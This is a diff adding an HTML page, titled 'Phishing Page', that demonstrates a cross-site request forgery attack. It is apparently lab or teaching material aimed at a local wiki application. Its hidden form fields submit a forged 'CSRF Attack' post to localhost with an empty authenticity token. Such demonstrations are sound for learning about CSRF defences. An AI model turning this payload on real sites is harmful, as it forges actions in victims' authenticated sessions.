@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing Page</title>
+</head>
+<body>
+  <h1>Fake Post Creation Page</h1>
+  <form action="http://localhost:3000/wiki_posts" method="post">
+    <input type="hidden" name="wiki_post[title]" value="CSRF Attack">
+    <input type="hidden" name="wiki_post[description]" value="You've been hacked!">
+    <input type="hidden" name="wiki_post[author]" value="Hacker Bill">
+    <input type="hidden" name="authenticity_token" value="">
+    <input type="submit" value="Create Post">
+  </form>
+</body>
+</html>
